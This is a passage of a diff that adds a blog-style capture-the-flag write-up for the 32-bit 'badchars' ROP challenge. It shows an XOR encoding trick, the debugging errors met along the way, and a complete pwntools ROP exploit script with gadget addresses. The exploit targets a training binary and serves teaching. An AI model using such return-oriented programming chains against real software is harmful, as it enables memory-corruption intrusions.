+                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;key is </span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>chars<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#75715e">#.join(chars))</span>
+
+xory(<span style="color:#e6db74">&#34;flag&#34;</span>)
+print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+xory(<span style="color:#e6db74">&#34;.txt&#34;</span>)
+</code></pre></div><p>I ran it:</p>
+<pre tabindex="0"><code>key is 2: ['d', 'n', 'c', 'e']
+
+key is 1: ['/', 'u', 'y', 'u']
+key is 2: [',', 'v', 'z', 'v']
+</code></pre><p>So we get a string &ldquo;dnce&rdquo; when xored with 2, will equal flag
+And another string &ldquo;,vzv&rdquo; when xored with 2, will equal .txt</p>
+<p>Nice!</p>
+<p>So we need to find our address in data, and xor that. Then we xor that address+0, address+1, address+2, address+3. And then the entire address is xored.</p>
+<p>We repeat that process and use it once again but with &ldquo;,vzv&rdquo; instead.</p>
+<p>Aaaaaaaaaand we get an error:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">Program received signal SIGSEGV, Segmentation fault.
+ <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0xf7f4f7e6</span>    mov    ecx, dword ptr [eax <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x34</span>]
+</code></pre></div><p>Wait&hellip; What? Now I was confused. I tried without the second part of the code, and I received this error:</p>
+<pre tabindex="0"><code>b&quot;Thank you!\nFailed to open file: flag\x90\x99\xf4\xf7\x10;\xf3\xf7\xbd&amp;\xf1\xf7\xf0\xed\xd2\xf7\xcf'\xf1\xf7\n\nChild exited with status 1\n&quot;
+</code></pre><p>What the fuck? Atleast it&rsquo;s a somewhat positive error. I know that it did indeed change dnce to flag in data. But it kept reading many more bytes
+afterwards&hellip;. Weird&hellip; I tried tried using the second part of the code but adding a nullbyte, but I just got the same:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0xf7f4f7e6</span>    mov    ecx, dword ptr [eax <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x34</span>]
+</code></pre></div><p>A crucial lesson was then learned. The GOT is also known as the Global Offset Table, and is used for holding addresses of functions, that need to be called. I was quite literally writing to the space in memory, that holds function addresses, does that seem smart, when I&rsquo;m trying to call a print_file function? No? No, not really.</p>
+<p>So let&rsquo;s try it with a different memory segment:, I used a segment with 4 bytes of size</p>
+<pre tabindex="0"><code>b&quot;Thank you!\nFailed to open file: flag\n\nChild exited with status 1\n&quot;
+</code></pre><p>Ofcourse this would yield an error since the flag is in &ldquo;flag.txt&rdquo;, and we only control 4 bytes</p>
+<p>I tried again but with .data, which is 8 bytes and boom!</p>
+<pre tabindex="0"><code>b'Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
+</code></pre><p>Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#Is it too late now to say XORy?</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+elfPath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./badchars32&#34;</span>
+context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;i386&#34;</span>
+
+<span style="color:#75715e">#BL is the lower 8 bits/1 byte of ebx: pop ebx=0xdeadbeef, then bl=&#34;ef&#34; (or something like this)</span>
+
+
+useFunc<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x08048538</span>) <span style="color:#75715e">#print</span>
+datasegm<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804a018</span> 
+
+xor_ebp_bl <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048547</span>) <span style="color:#75715e">#xor [ebp],bl</span>
+mov_edi_esi <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0804854f</span>) <span style="color:#75715e">#mov [edi], esi</span>
+
+pop_esi_edi_ebp<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x080485b9</span>)      <span style="color:#75715e">#pop esi; pop edi; pop ebp; ret</span>
+pop_ebx<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x0804839d</span>)      <span style="color:#75715e">#pop ebx; ret</span>
+pop_ebp<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x080485bb</span>)      <span style="color:#75715e">#pop ebp; ret</span>
+
+badCharstxt<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;x&#34;</span>,<span style="color:#e6db74">&#34;g&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>,<span style="color:#e6db74">&#34;.&#34;</span>]
+
+gdbscript<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">c
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;gnome-terminal&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>]
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting)
+
+io <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug(elfPath, gdbscript <span style="color:#f92672">=</span> gdbscript)
+
+<span style="color:#75715e">#mnm = cyclic_gen()</span>
+<span style="color:#75715e">#mnm = mnm.get(80)</span>
+point<span style="color:#f92672">=</span>cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;laaa&#34;</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;little&#34;</span>)
+<span style="color:#75715e">#6161616c is at the return or laaa</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    print(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>))
+
+    payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>point <span style="color:#75715e">#padding</span>
+    
+    payload<span style="color:#f92672">+=</span>pop_esi_edi_ebp<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;dnce&#34;</span><span style="color:#f92672">+</span>p32(datasegm)<span style="color:#f92672">+</span>p32(datasegm) <span style="color:#75715e">#Sets esi=&#34;dnce&#34;, edi=address of .data, ebp=address of .data</span>
+    payload<span style="color:#f92672">+=</span>mov_edi_esi <span style="color:#75715e">#moves esi into the address of edi (&#34;dnce&#34; -&gt; .data)</span>
+
+<span style="color:#75715e">######################################################</span>
+    payload<span style="color:#f92672">+=</span>pop_ebx<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">2</span>) <span style="color:#75715e">#sets ebx=2</span>
+    
+    payload<span style="color:#f92672">+=</span>xor_ebp_bl <span style="color:#75715e">#xor datasegm with 2</span>
+    
+    payload<span style="color:#f92672">+=</span>pop_ebp<span style="color:#f92672">+</span>p32(datasegm<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
+    payload<span style="color:#f92672">+=</span>xor_ebp_bl <span style="color:#75715e">#xor datasegm+1 with 2</span>
+
+    payload<span style="color:#f92672">+=</span>pop_ebp<span style="color:#f92672">+</span>p32(datasegm<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
+    payload<span style="color:#f92672">+=</span>xor_ebp_bl <span style="color:#75715e">#so on</span>
+
+    payload<span style="color:#f92672">+=</span>pop_ebp<span style="color:#f92672">+</span>p32(datasegm<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>)
+    payload<span style="color:#f92672">+=</span>xor_ebp_bl
+
+<span style="color:#75715e">######################################################</span>
+    
+    payload<span style="color:#f92672">+=</span>pop_esi_edi_ebp<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;,vzv&#34;</span><span style="color:#f92672">+</span>p32(datasegm<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4</span>)<span style="color:#f92672">+</span>p32(datasegm<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4</span>) <span style="color:#75715e">#Sets esi=&#34;,vzv&#34;, edi=address of .data, ebp=address of .data</span>
+    payload<span style="color:#f92672">+=</span>mov_edi_esi <span style="color:#75715e">#moves esi into the address of edi (&#34;,vzv&#34; -&gt; .data+0x4)</span>
+
+<span style="color:#75715e">######################################################</span>
+    payload<span style="color:#f92672">+=</span>pop_ebx<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">2</span>) <span style="color:#75715e">#sets ebx=2</span>
+
+    payload<span style="color:#f92672">+=</span>xor_ebp_bl <span style="color:#75715e">#xor datasegm with 2</span>
+
+    payload<span style="color:#f92672">+=</span>pop_ebp<span style="color:#f92672">+</span>p32(datasegm<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>)
+    payload<span style="color:#f92672">+=</span>xor_ebp_bl <span style="color:#75715e">#xor datasegm+1 with 2</span>
+
+    payload<span style="color:#f92672">+=</span>pop_ebp<span style="color:#f92672">+</span>p32(datasegm<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>)
+    payload<span style="color:#f92672">+=</span>xor_ebp_bl <span style="color:#75715e">#so on</span>
+
+    payload<span style="color:#f92672">+=</span>pop_ebp<span style="color:#f92672">+</span>p32(datasegm<span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>)
+    payload<span style="color:#f92672">+=</span>xor_ebp_bl
+
+<span style="color:#75715e">######################################################</span>
+    payload<span style="color:#f92672">+=</span>useFunc<span style="color:#f92672">+</span>p32(datasegm)
+
+    io<span style="color:#f92672">.</span>send(payload)
+    print(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">2048</span>))
+    io<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
